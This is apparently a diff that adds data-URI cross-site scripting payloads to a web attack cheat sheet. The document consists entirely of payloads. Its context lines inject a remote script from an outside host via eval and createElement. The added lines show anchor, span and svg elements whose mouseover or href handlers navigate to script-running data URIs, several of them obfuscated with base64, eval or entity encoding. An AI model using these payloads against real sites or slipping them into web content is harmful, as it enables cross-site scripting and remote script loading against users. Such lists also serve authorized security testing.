@@ -34,3 +34,42 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+<!-- DATA URI PAYLOADS -->
+<a href="data:text/html,<script>alert(document.domain)</script>">ClickME-document.domain</a>
+<a onmouseover="location.href='data:text/html,<script>alert(document.domain)</script>'">HoverME-domain</a>
+<a href="#" onmouseover="window.location='data:text/html,<script>alert(document.domain)</script>'">
+HoverME-domain
+</a>
+<a onmouseover="(function(){location.href='data:text/html,<script>alert(document.domain)</script>'})();">
+HoverME-domain
+</a>
+<a href="#" onmouseover="this.href='data:text/html,<script>alert(document.domain)</script>'">
+HoverME-domain
+</a>
+<a href="#" onmouseover="this.firstElementChild.click()">
+  <span id="poc" onclick="location.href='data:text/html,<script>alert(document.domain)</script>'">HoverME-domain</span>
+</a>
+<svg onmouseover="location.href='data:text/html,<script>alert(document.domain)</script>'">
+HoverME
+</svg>
+<a onmouseover="location='data:text/html,<script>alert(document.domain)</script>'">
+HoverME-domain
+</a>
+<a onmouseover="location.href='data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'">
+HoverME-domain
+</a>
+<a onmouseover="eval('location.href=`data:text/html,<script>alert(document.domain)</script>`')">
+HoverME-domain
+</a>
+<a onmouseover = " location.href = 'data:text/html,<script>alert(document.domain)</script>' ">
+HoverME-domain
+</a>
+<a onmouseover="location.href=&quot;data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;">
+HoverME-domain
+</a>
+<a>
+  <span onmouseover="location.href='data:text/html,<script>alert(document.domain)</script>'">
+    HoverME-domain
+  </span>
+</a>
